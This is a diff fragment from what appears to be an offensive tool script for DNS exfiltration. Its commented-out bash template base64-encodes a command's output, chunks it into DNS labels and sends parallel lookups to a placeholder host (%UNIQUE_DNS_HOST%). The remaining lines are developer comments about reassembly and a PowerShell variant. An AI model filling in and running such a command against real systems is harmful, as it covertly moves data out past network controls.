@@ -187,7 +187,8 @@ printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\
 
 #looks like different script would be more appropriate for implementing
 #the server side data extraction similar with: https://github.com/0xC01DF00D/Collabfiltrator
-#the below command should work for bash with support for parallelism through xargs
+
+#we need an identifier with each dns request to help when reassembling the data (e.g. properly implement STAGE_ID)
 #bash_cmd="(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
 
 #since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach
